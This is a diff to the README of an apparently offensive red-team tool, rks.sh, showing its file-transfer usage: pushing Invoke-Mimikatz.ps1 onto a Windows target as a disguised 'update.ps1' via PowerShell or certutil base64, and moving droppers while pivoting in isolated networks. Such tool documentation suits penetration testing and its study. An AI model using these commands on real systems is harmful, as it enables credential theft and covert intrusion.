@@ -141,17 +141,14 @@ $ ./rks.sh -c "python -c \"<payload>\""
 
 ### File Transfer
 
-- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. However, there is a limitation for handling a large file. The script will you provide suggestion as an alternative if you insist using base64.
+- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified.
 
 ```
 $ ./rks.sh -c "powershell.exe" -m dialogbox
 
 $ ./rks.sh -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
 [*] Transferring file...
-[*] Checking one of the lines reaches 3477 character limit
-[-] Character Limit reached!
-[*] Use 'pwshcertutil' as a method instead.
-[*] Terminating program...
+[+] File transferred!
 ```
 
 - To transfer droppers you can use certutil base64 especially if it's large. Keep in mind it'll take time depending the size of the file.
